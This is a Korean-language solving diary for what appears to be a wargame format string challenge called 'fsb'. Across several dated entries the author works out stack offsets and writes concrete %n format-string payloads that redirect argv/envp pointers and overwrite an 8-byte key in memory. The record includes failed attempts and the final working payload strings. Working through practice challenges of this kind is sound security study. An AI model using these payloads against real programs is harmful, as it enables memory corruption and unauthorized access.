2021.11.2 화

fsb 소스를 보면
pargv와 penvp는 0으로 설정하지 않는다.
이를 이용해 스택에서 argv와 envp의 주소로 값을 덮어쓸수 있다
key의 주소는 0x804a060 고정이므로 pargv값을 %n으로 참조해 key 주소값(0x804a060)을 argv에 덮어쓴 뒤
argv값을 %n으로 참조해 key값을 마음대로 바꾸면 완벽범죄
근데 생각해보니 100바이트 입력제한이 걸려있어 값 조작이 자유롭진 않을 것 같다

2021.11.13 토

아니다 입력제한이 걸려있어도 값 조작은 마음대로 할 수 있다!
%10000d 처럼 쓰면 문자가 10000개 출력됨 => 값 조작에 제한 x

fsb 프로시저에서 처음에 스택을 0x48만큼 할당하고
pargv는 ebp-0x10 위치 고정이니까 스택 최상단 기준 오프셋은 0x38(=56)
4로 나누면 14, %x를 14번 하고 %n 넣어주면 argv값을 조작할 수 있다
조작 할 값은 0x804a060, 10진수로 풀면 134520928
%8x한다 치면 일단 13번 하면 104이고 그럼 134520824가 남으니까 마지막에 %134520824x 해주면 값이 제대로 조작될것이다

1트
pargv 위치 : 0xffc47d18
argv 위치 : 0xffc47d30
마지막으로 출력된 값 : 0xffc47d18

출력 문자열도 스택에 push된다는걸 간과하고 있었음

%x는 14번이 아니라 13번 출력 해야한다
그럼 값을 조금 수정하면

%8x을 12번 하면 길이가 96이니까 %134520832x 하나 넣고 %n으로 조작하면 된다

2트

pargv 위치 : 0xfff252a8
argv 위치 : 0xfff252c0
마지막으로 출력된 값 : 0xfff252c0

입력할때 실수했나?

3트

pargv 위치 : ff97ccd8
argv 위치 : ff97ccf0
마지막으로 출력된 값 : 0xff980fe0

ㅇㅋ 3트만에 성공
argv값이 key 주소값으로 조작됐다

스택 최상단부터 argv 오프셋 : 0x48 + 8 = 80
문자열 주소 크기 빼면 : 76
4로 나누면 : 19
포맷 스트링은 '%8x' * 19 + '%n'
key값은 152

payload1 = '%8x' * 12 + '%134520832x%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520832x%n
payload2 = '%8x' * 19 + '%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n

근데 key는 8바이트였다
그래도 여기까지 하위 4바이트는 조작 성공
상위 4바이트도 비슷하게 조작하면 될듯?

마찬가지로
스택 최상단부터 pargv 오프셋 : 0x38
문자열 오프셋 빼면 : 0x34(=52)
4로 나누면 : 13
조작해줄 값 : 0x804a064(=134520932)
포맷 스트링 : '%8x' * 12 + '%134520836x' + '%n'

이후 argv로 접근
포맷 스트링 : '%8x' * 19 + '%n'

payload3 = '%8x' * 12 + '%134520836x' + '%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520836x%n
payload4 = '%8x' * 19 + '%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n

여기까지 실행되면 key는
98 00 00 00 98 00 00 00 = 652835029144로 바뀐다가 이론인데
3번째 입력할 때 잘 안되서 스택을 살펴보니
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520836x%n\nx%8x%8x%n\n 이런식으로 되어있었음. read 함수가 문자열 끝에 null을 안붙여줘서 저런거
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520836x%naaaaaaaaaaaaaaaaaa로 바꿔서 해결했다

key는 잘 조작됐는데
key입력 후 검증하는 부분에서 막혔다.
아니 분명 소스코드에선 strtoull의 리턴값을 그대로 key랑 비교하는데
디버거로 분석해보니까 strtoull에서 리턴값을 pw에 저장할 때
상위 4바이트는 짜르고 저장함

2021.11.14 일

strtoull 리턴 값을
특정한 연산을 통해 처리하는 것 같다.
그 특정한 연산은 상위 4바이트는 짜르고,
하위 4바이트를 sar 1f 한 값을 상위 4바이트로 삼는 것이다.
의도를 해석해보면 하위 4바이트가 양수면 상위 4바이트를 0으로 맞추고
음수면 상위 4바이트는 FFFFFFFF로 맞추는 것이다.
근데 %n으로는 0을 넣어주는게 불가능하니 결국 
key 값은 하위 4바이트가 음수이고, 상위 4바이트는 FFFFFFFF가 되도록 맞춰줘야 한다.
그럼 key값을 이렇게 설정하면 되지 않을까??

00 00 00 80 FF FF FF FF

payload 2번과 4번을 각각 수정하면 되겠다.

%8x을 18번 = 144
2147483648(0x80000000) - 144 = 2147483504
payload2 = '%8x' * 18 + '%2147483504x' + '%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%2147483504x%n

4294967295(0xFFFFFFFF) - 144 = 4294967151
payload4 = '%8x' * 18 + '%4294967151x' + '%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%4294967151x%n

key값 = 2147483648

실제로 해보니 음수값은 못 쓴다. 실패

생각을 해보니 pargv와 penvp 두 개를 준 이유가 있을것 같다.
그럼 만약에 pargv에 0x804a060, penvp에 0x804a064를 넣고 %n을 동시에 해준다면?
3번만에 값을 덮어쓸 수 있다.
아 이렇게 공격 기회를 더 확보 할 수 있구나

argv에 0x804a060, envp에 0x804a064, 그 밑에 0x804a061을 넣고 %n을 동시에 해주면
주어진 4번의 기회 안에서 상위 4바이트를 0으로 만들고 하위 4바이트를 양수로 만들어 줄 수 있을 것이다.

하지만 여기서 생기는 문제점이 argv와 envp는 확보됬지만 나머지 하나가 부족하다
그 하나를 한번 찾아보려고 했지만 그건 없고
argv와 envp를 동시에 덮어써서 기회를 하나 더 확보 할 수 있음을 떠올렸다!
그럼 시나리오는
1. argv를 0x804a060, envp를 0x804a064로 동시에 덮어쓰고
2. %n을 동시에 해준뒤
3. argv를 0x804a061로 덮어쓰고
4. %n으로 상위 4바이트를 0으로 만들면 끝!

payload1 = '%8x' * 12 + '%134520832x%nAAAA%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520832x%nAAAA%n
payload2 = '%8x' * 19 + '%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n%n
payload3 = '%8x' * 12 + '%134520833x%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%134520833x%nAAAAAAAAAAAAAAA
payload4 = '%8x' * 19 + '%n'
%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n

key = 0x9898(=39064)